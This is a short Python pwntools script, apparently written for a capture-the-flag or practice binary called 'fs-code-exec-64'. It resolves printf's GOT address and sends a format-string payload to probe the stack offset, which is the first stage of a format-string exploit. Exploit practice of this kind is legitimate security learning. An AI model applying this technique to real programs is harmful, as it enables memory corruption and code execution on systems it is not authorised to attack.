from pwn import *
p = process("./fs-code-exec-64")

got_printf = p.elf.got['printf']
print hex(got_printf)
p.sendline( "%7$p0000"+ p64(got_printf))

print repr(p.recv(timeout=5))
